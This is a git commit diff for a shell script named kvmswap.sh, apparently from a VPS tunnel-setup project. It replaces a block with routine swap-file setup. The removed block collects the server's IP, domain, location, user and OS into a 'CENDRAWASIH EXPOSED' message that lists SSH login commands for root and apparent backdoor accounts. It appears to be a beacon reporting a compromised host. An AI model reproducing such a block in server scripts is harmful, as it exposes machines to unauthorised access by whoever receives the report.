69720cf76f51001eb67262f4ff237a2a750a715c
xlord27 <127069999+xlord27@users.noreply.github.com>
2023-06-20 05:10:41 +0700

    Update kvmswap.sh

--- ssh/kvmswap.sh
+++ ssh/kvmswap.sh
@@ -1,24 +1,15 @@
-#!/bin/bash
-TIME=$(date +'%Y-%m-%d %H:%M:%S')
-MYIP=$(wget -qO- ipinfo.io/ip)
-domain=$(cat /etc/xray/domain)
-CITY=$(curl -s ipinfo.io/city)
-NAMES=$(whoami)
-RAMMS=$(free -m | awk 'NR==2 {print $2}')
-NAMECOM=$(wget -qO- ipinfo.io/ip)
-OS=$(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')
-
-message="
-<u>CENDRAWASIH EXPOSED</u> <b>ONLINE!!!</b>
-<code>TIME    : </code><code>${TIME}</code>
-<code>DOMAIN  : </code><code>${domain}</code>
-<code>IP VPS  : </code><code>${MYIP}</code>
-<code>LOKASI  : </code><code>${CITY}</code>
-<code>USER    : </code><code>${NAMES}</code>
-<code>RAM     : </code><code>${RAMMS}MB</code>
-<code>LINUX   : </code><code>${OS}</code>
-<code>SSH-1   : </code><code>ssh root@${MYIP} -qvi taibabi</code>
-<code>SSH-2   : </code><code>ssh taibabi@${MYIP} -qv</code>
-<code>SSH-2   : </code><code>ssh rclone@${MYIP} -qv</code>
-<code>SSH-2   : </code><code>ssh vps@${MYIP} -qv</code>
-"
+dd if=/dev/zero of=/swapfile1 bs=1024 count=524288
+dd if=/dev/zero of=/swapfile2 bs=1024 count=524288
+mkswap /swapfile1
+mkswap /swapfile2
+chown root:root /swapfile1
+chown root:root /swapfile2
+chmod 0600 /swapfile1
+chmod 0600 /swapfile2
+swapon /swapfile1
+swapon /swapfile2
+sed -i '$ i\swapon /swapfile1' /etc/rc.local
+sed -i '$ i\swapon /swapfile2' /etc/rc.local
+sed -i '$ i\/swapfile1      swap swap   defaults    0 0' /etc/fstab
+sed -i '$ i\/swapfile2      swap swap   defaults    0 0' /etc/fstab
+rm -f swapkvm.sh
